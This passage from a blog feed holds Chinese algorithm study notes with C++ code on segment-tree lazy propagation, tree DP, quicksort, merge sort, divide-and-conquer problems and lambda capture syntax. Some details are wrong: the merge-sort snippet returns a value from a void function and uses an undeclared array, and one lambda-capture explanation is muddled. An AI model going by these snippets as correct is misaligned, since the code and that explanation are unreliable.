title="线段树的区间修改与懒惰标记"></a>线段树的区间修改与懒惰标记</h3><p>如果要求修改区间[l,r]，那么把包含区间[l,r]的节点全部修改一次的复杂度不能接受，由此引入懒惰标记。<br>懒惰标记，简单来说，就是通过延迟对节点信息的更改，从而减少可能不必要的操作次数。每次执行修改时，我们通过打标记的方法表明该节点对应的区间在某一次操作中被更改，但不更新该节点的子节点的信息。实质性的修改则在下一次访问带有标记的节点时才进行。<br>区间修改：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-comment">// [l, r] 为修改区间, c 为被修改的元素的变化量, [s, t] 为当前节点包含的区间, p</span><br>  <span class="hljs-comment">// 为当前节点的编号</span><br>  <span class="hljs-keyword">if</span> (l &lt;= s &amp;&amp; t &lt;= r) &#123;<br>    d[p] += (t - s + <span class="hljs-number">1</span>) * c, b[p] += c;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;  <span class="hljs-comment">// 当前区间为修改区间的子集时直接修改当前节点的值,然后打标记,结束修改</span><br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (b[p] &amp;&amp; s != t) &#123;<br>    <span class="hljs-comment">// 如果当前节点的懒标记非空,则更新当前节点两个子节点的值和懒标记值</span><br>    d[p * <span class="hljs-number">2</span>] += b[p] * (m - s + <span class="hljs-number">1</span>), d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] += b[p] * (t - m);<br>    b[p * <span class="hljs-number">2</span>] += b[p], b[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] += b[p];  <span class="hljs-comment">// 将标记下传给子节点</span><br>    b[p] = <span class="hljs-number">0</span>;                                <span class="hljs-comment">// 清空当前节点的标记</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (l &lt;= m) <span class="hljs-built_in">update</span>(l, r, c, s, m, p * <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span> (r &gt; m) <span class="hljs-built_in">update</span>(l, r, c, m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  d[p] = d[p * <span class="hljs-number">2</span>] + d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>区间查询（区间求和）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getsum</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-comment">// [l, r] 为查询区间, [s, t] 为当前节点包含的区间, p 为当前节点的编号</span><br>  <span class="hljs-keyword">if</span> (l &lt;= s &amp;&amp; t &lt;= r) <span class="hljs-keyword">return</span> d[p];<br>  <span class="hljs-comment">// 当前区间为询问区间的子集时直接返回当前区间的和</span><br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (b[p]) &#123;<br>    <span class="hljs-comment">// 如果当前节点的懒标记非空,则更新当前节点两个子节点的值和懒标记值</span><br>    d[p * <span class="hljs-number">2</span>] += b[p] * (m - s + <span class="hljs-number">1</span>), d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] += b[p] * (t - m),<br>        b[p * <span class="hljs-number">2</span>] += b[p], b[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] += b[p];  <span class="hljs-comment">// 将标记下传给子节点</span><br>    b[p] = <span class="hljs-number">0</span>;                                    <span class="hljs-comment">// 清空当前节点的标记</span><br>  &#125;<br>  <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (l &lt;= m) sum = <span class="hljs-built_in">getsum</span>(l, r, s, m, p * <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span> (r &gt; m) sum += <span class="hljs-built_in">getsum</span>(l, r, m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure><p>区间修改为某一个值：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (l &lt;= s &amp;&amp; t &lt;= r) &#123;<br>    d[p] = (t - s + <span class="hljs-number">1</span>) * c, b[p] = c;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (b[p]) &#123;<br>    d[p * <span class="hljs-number">2</span>] = b[p] * (m - s + <span class="hljs-number">1</span>), d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] = b[p] * (t - m),<br>          b[p * <span class="hljs-number">2</span>] = b[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] = b[p];<br>    b[p] = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (l &lt;= m) <span class="hljs-built_in">update</span>(l, r, c, s, m, p * <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span> (r &gt; m) <span class="hljs-built_in">update</span>(l, r, c, m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  d[p] = d[p * <span class="hljs-number">2</span>] + d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getsum</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (l &lt;= s &amp;&amp; t &lt;= r) <span class="hljs-keyword">return</span> d[p];<br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (b[p]) &#123;<br>    d[p * <span class="hljs-number">2</span>] = b[p] * (m - s + <span class="hljs-number">1</span>), d[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] = b[p] * (t - m),<br>          b[p * <span class="hljs-number">2</span>] = b[p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] = b[p];<br>    b[p] = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (l &lt;= m) sum = <span class="hljs-built_in">getsum</span>(l, r, s, m, p * <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span> (r &gt; m) sum += <span class="hljs-built_in">getsum</span>(l, r, m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure><p>拓展猫树等：<a href="https://oi-wiki.org/ds/seg/">https://oi-wiki.org/ds/seg/</a></p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>树形dp</title>
    <link href="/2022/04/05/%E6%A0%91%E5%BD%A2dp/"/>
    <url>/2022/04/05/%E6%A0%91%E5%BD%A2dp/</url>
    
    <content type="html"><![CDATA[<p>树形 DP，即在树上进行的 DP。由于树固有的递归性质，树形 DP 一般都是递归进行的。<br>经典例题：没有上司的舞会。<br><a href="https://www.acwing.com/activity/content/problem/content/1012/">https://www.acwing.com/activity/content/problem/content/1012/</a><br>状态设定：<br>dp[u][2]&#x2F;&#x2F;0表示不选该点，1表示选该节点的快乐指数。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">6005</span>;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">tree</span>(N,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;());<br><span class="hljs-type">int</span> happy[N];<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">bool</span> vis[N];<br><span class="hljs-type">int</span> dp[N][<span class="hljs-number">2</span>];<span class="hljs-comment">//0表示不选该点，1表示选该节点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><span class="hljs-comment">//递归求解</span></span><br><span class="hljs-function"></span>&#123;<br>    dp[u][<span class="hljs-number">1</span>] = happy[u];<span class="hljs-comment">//选该节点，那么dp[u][1]等于该快乐值</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>&amp;v:tree[u])<span class="hljs-comment">//遍历所有孩子</span><br>    &#123;<br>        <span class="hljs-built_in">dfs</span>(v);<span class="hljs-comment">//递归搜索</span><br>        dp[u][<span class="hljs-number">0</span>] +=<span class="hljs-built_in">max</span>(dp[v][<span class="hljs-number">0</span>],dp[v][<span class="hljs-number">1</span>]);<span class="hljs-comment">//状态转移，当不选该节点时，最大快乐值为选择或不选该孩子节点的最大值。</span><br>        dp[u][<span class="hljs-number">1</span>] += dp[v][<span class="hljs-number">0</span>];<span class="hljs-comment">//当选择该点时，不能选孩子节点，所有快乐值为dp[v][0]。</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        cin&gt;&gt;happy[i];<span class="hljs-comment">//输入节点值</span><br>    &#125;<br>    <span class="hljs-type">int</span> l,k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n<span class="hljs-number">-1</span>;i++)<span class="hljs-comment">//建树</span><br>    &#123;<br>        cin&gt;&gt;l&gt;&gt;k;<br>        tree[k].<span class="hljs-built_in">push_back</span>(l);<br>        vis[l] =<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> root = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(vis[root])<span class="hljs-comment">//找root节点</span><br>    &#123;<br>        root++;<br>    &#125;<br>    <span class="hljs-built_in">dfs</span>(root);<br>    cout&lt;&lt;<span class="hljs-built_in">max</span>(dp[root][<span class="hljs-number">0</span>],dp[root][<span class="hljs-number">1</span>])&lt;&lt;endl;<span class="hljs-comment">//最大值为选择根节点与不选择根节点当中的最大值。</span><br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>分治</title>
    <link href="/2022/04/05/%E5%88%86%E6%B2%BB/"/>
    <url>/2022/04/05/%E5%88%86%E6%B2%BB/</url>
    
    <content type="html"><![CDATA[<p>把一个复杂的问题分成两个或更多的相同或相似的子问题，再把子问题分成更小的子问题……直到最后子问题可以简单的直接求解，原问题的解即子问题的解的合并。</p><p>例题：<br>快速排序：<br><a href="https://www.acwing.com/problem/content/787/">https://www.acwing.com/problem/content/787/</a><br>快速排序的思想就是基于分治。<br>1.首先设定一个分界值，通过该分界值将数组分成左右两部分。<br>2.将大于或等于分界值的数据集中到数组右边，小于分界值的数据集中到数组的左边。一趟排序过后，左边部分中各个数据元素都小于分界值，而右边部分中各数据元素都大于或等于分界值，且右边部分个数据元素皆大于左边所有数据元素。<br>3.然后，左边和右边的数据可以看成两组不同的部分，重复上述1和2步骤<br>当左右两部分都有序时，整个数据就完成了排序。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">qksort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp;a,<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(l&gt;=r) <span class="hljs-keyword">return</span> ;<br>    <span class="hljs-type">int</span> i = l<span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> j = r+<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> x = a[(l+r)&gt;&gt;<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">while</span>(i&lt;j)<br>    &#123;<br>        <span class="hljs-keyword">do</span> i++; <span class="hljs-keyword">while</span>(a[i]&lt;x);<br>        <span class="hljs-keyword">do</span> j--; <span class="hljs-keyword">while</span>(a[j]&gt;x);<br>        <span class="hljs-keyword">if</span>(i&lt;j) <span class="hljs-built_in">swap</span>(a[i],a[j]);<br>    &#125;<br>    <span class="hljs-built_in">qksort</span>(a,l,j);<br>    <span class="hljs-built_in">qksort</span>(a,j+<span class="hljs-number">1</span>,r);<br>&#125;<br></code></pre></td></tr></table></figure><p>归并排序：将原序列化成一个一个子序列，将已有的子序列进行合并，从而得到完全有序的序列。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge_sort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp;a,<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(l&gt;=r )<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> mid =(l+r)&gt;&gt;<span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">merge_sort</span>(a,l,mid);<br>    <span class="hljs-built_in">merge_sort</span>(a,mid+<span class="hljs-number">1</span>,r);<br>    <span class="hljs-type">int</span> k =<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i = l;<br>    <span class="hljs-type">int</span> j = mid+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;=mid &amp;&amp; j&lt;=r)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(a[i]&lt;=a[j]) tmp[k++] = a[i++];<br>        <span class="hljs-keyword">else</span> tmp[k++] = a[j++];<br>    &#125;<br>    <span class="hljs-keyword">while</span>(i&lt;=mid)tmp[k++] = a[i++];<br>    <span class="hljs-keyword">while</span>(j&lt;=r)tmp[k++] = a[j++];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>,i=l;i&lt;=r;i++,k++)<br>    &#123;<br>        a[i] = tmp[k];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>为运算表达式设置优先级：<br><a href="https://leetcode.cn/problems/different-ways-to-add-parentheses/">https://leetcode.cn/problems/different-ways-to-add-parentheses/</a><br>将表达式看成 x op y的形式，而每个x,y又可以划分成x op y的子问题。<br>因此可以利用分治的思想，将运算符分为两部分进行递归求解，根据运算符合并两部分的解，得出最终解。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">diffWaysToCompute</span><span class="hljs-params">(string expression)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = expression.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> flag =<span class="hljs-number">0</span>;<br>        vector&lt;<span class="hljs-type">int</span>&gt;vec1,vec2,res;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(expression[i]==<span class="hljs-string">&#x27;+&#x27;</span> || expression[i]==<span class="hljs-string">&#x27;-&#x27;</span> || expression[i]==<span class="hljs-string">&#x27;*&#x27;</span>)<br>            &#123;<br>                flag = <span class="hljs-number">1</span>;<br>                vec1 =  <span class="hljs-built_in">diffWaysToCompute</span>(expression.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>,i));<br>                vec2 = <span class="hljs-built_in">diffWaysToCompute</span>(expression.<span class="hljs-built_in">substr</span>(i+<span class="hljs-number">1</span>,n-i<span class="hljs-number">-1</span>));<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>&amp;v1:vec1)<br>                &#123;<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>&amp;v2:vec2)<br>                    &#123;<br>                        <span class="hljs-keyword">if</span>(expression[i]==<span class="hljs-string">&#x27;+&#x27;</span>) res.<span class="hljs-built_in">push_back</span>(v1+v2);<br>                        <span class="hljs-keyword">if</span>(expression[i]==<span class="hljs-string">&#x27;-&#x27;</span>) res.<span class="hljs-built_in">push_back</span>(v1-v2);<br>                        <span class="hljs-keyword">if</span>(expression[i]==<span class="hljs-string">&#x27;*&#x27;</span>) res.<span class="hljs-built_in">push_back</span>(v1*v2);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(flag ==<span class="hljs-number">0</span>) res.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">stoi</span>(expression));<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="归并应用："><a href="#归并应用：" class="headerlink" title="归并应用："></a>归并应用：</h4><p><a href="https://www.acwing.com/problem/content/148/">https://www.acwing.com/problem/content/148/</a><br>将第一个输入的序列按从小到大进行排序进行，然后依次与后面输入的序列进行组合合并，取最小的前n个，利用堆来进行多路归并。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">2010</span>;<br><span class="hljs-type">int</span> a[N],b[N],c[N];<br><span class="hljs-type">int</span> m,n;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    priority_queue&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;,vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;,greater&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;&gt;pq;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        pq.<span class="hljs-built_in">push</span>(&#123;a[<span class="hljs-number">0</span>]+b[i],<span class="hljs-number">0</span>&#125;);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">auto</span> [s,p] =pq.<span class="hljs-built_in">top</span>();<br>        pq.<span class="hljs-built_in">pop</span>();<br>        c[i] =s;<br>        pq.<span class="hljs-built_in">push</span>(&#123;s-a[p]+a[p+<span class="hljs-number">1</span>],p+<span class="hljs-number">1</span>&#125;);<span class="hljs-comment">//由a[0]+b[i]-&gt;a[1]+b[i],进行状态变化。</span><br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        a[i]=c[i];<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;t);<br>    <span class="hljs-keyword">while</span>(t--)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;m,&amp;n);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[i]);<br>        <span class="hljs-built_in">sort</span>(a,a+n);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m<span class="hljs-number">-1</span>;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;b[j]);<br>            <span class="hljs-built_in">merge</span>();<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,a[i]);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C++Lambda表达式</title>
    <link href="/2022/03/28/C++Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2022/03/28/C++Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>lambda函数的语法<br>基本形式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">[capture](parameters)-&gt;<span class="hljs-keyword">return</span>-type &#123;body&#125;<br></code></pre></td></tr></table></figure><ul><li>[]叫做捕获说明符，表示一个lambda表达式的开始。接下来是参数列表，即这个匿名的lambda函数的参数。</li><li>parameters，普通参数列表</li><li>-&gt;return-type表示返回类型，如果没有返回类型，则可以省略这部分。这涉及到c++11的另一特性，参见自动类型推导，最后就是函数体部分。<br>-[ ]        ：无捕获，函数体内不能访问任何外部变量 </li><li>[ &#x3D;]      ：以值（拷贝）的方式捕获所有外部变量，函数体内可以访问，但是不能修改。</li><li>[ &amp;]      ：以引用的方式捕获所有外部变量，函数体内可以访问并修改（需要当心无效的引用）；</li><li>[ var]   ：以值（拷贝）的方式捕获某个外部变量，函数体可以访问但不能修改。</li><li>[ &amp;var] ：以引用的方式获取某个外部变量，函数体可以访问并修改</li><li>[ this]   ：捕获this指针，可以访问类的成员变量和函数，</li><li>[ &#x3D;，&amp;var] ：引用捕获变量var，其他外部变量使用值捕获。</li><li>[ &amp;，var]：只捕获变量var，其他外部变量使用引用捕获。</li></ul>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>单调队列单调栈</title>
    <link href="/2022/03/27/%E5%8D%95%E8%B0%83%E9%98%9F%E5%88%97%E5%8D%95%E8%B0%83%E6%A0%88/"/>
    <url>/2022/03/27/%E5%8D%95%E8%B0%83%E9%98%9F%E5%88%97%E5%8D%95%E8%B0%83%E6%A0%88/</url>
    
